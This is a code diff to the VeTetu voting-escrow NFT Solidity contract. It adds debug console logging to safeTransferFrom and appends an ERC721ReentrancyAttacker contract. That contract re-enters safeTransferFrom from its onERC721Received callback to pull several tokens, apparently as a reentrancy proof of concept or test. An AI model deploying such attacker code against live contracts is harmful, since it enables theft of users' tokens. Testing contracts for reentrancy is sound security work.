@@ -14,6 +14,7 @@ import "../interfaces/ISmartVault.sol";
 import "../interfaces/IVeDistributor.sol";
 import "../proxy/ControllableV3.sol";
 import "./VeTetuLib.sol";
+import "hardhat/console.sol";
 
 /// @title Voting escrow NFT for multiple underlying tokens.
 ///        Based on Curve/Solidly contract.
@@ -573,10 +574,14 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
     uint _tokenId,
     bytes memory _data
   ) public override {
+    console.log("safeTransferFrom: _from, _to, _tokenId", _from, _to, _tokenId);
     require(isWhitelistedTransfer[_to] || isWhitelistedTransfer[_from], "FORBIDDEN");
+    console.log("safeTransferFrom.2");
 
     _transferFrom(_from, _to, _tokenId, msg.sender);
+    console.log("safeTransferFrom.3");
     require(_checkOnERC721Received(_from, _to, _tokenId, _data), "ERC721: transfer to non ERC721Receiver implementer");
+    console.log("safeTransferFrom.4");
   }
 
   /// @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
@@ -1324,5 +1329,37 @@ contract VeTetu is ControllableV3, ReentrancyGuard, IVeTetu {
     _removeTokenFrom(owner, _tokenId);
     emit Transfer(owner, address(0), _tokenId);
   }
+}
 
+
+contract ERC721ReentrancyAttacker {
+  VeTetu vulnerable;
+
+  uint256 tokensTo = 10;
+
+  constructor(VeTetu _vulnerable) {
+    vulnerable = _vulnerable;
+  }
+
+  // Reentrancy attack
+  function attack(address from) public payable {
+    console.log("Attack from", from);
+    tokensTo--;
+    //vulnerable.safeTransferFrom();
+    console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo);
+    vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
+  }
+
+  // Callback function
+  function onERC721Received(address, address from, uint256, bytes calldata) external returns (bytes4) {
+    console.log("onERC721Received");
+    if (tokensTo > 0) {
+      tokensTo--;
+      //vulnerable.safeTransferFrom();
+      console.log("safeTransferFrom from to tokensTo", from, address(this) ,tokensTo);
+      vulnerable.safeTransferFrom(from, address(this) ,tokensTo, "");
+    }
+    return this.onERC721Received.selector;
+  }
+  receive() external payable {}
 }
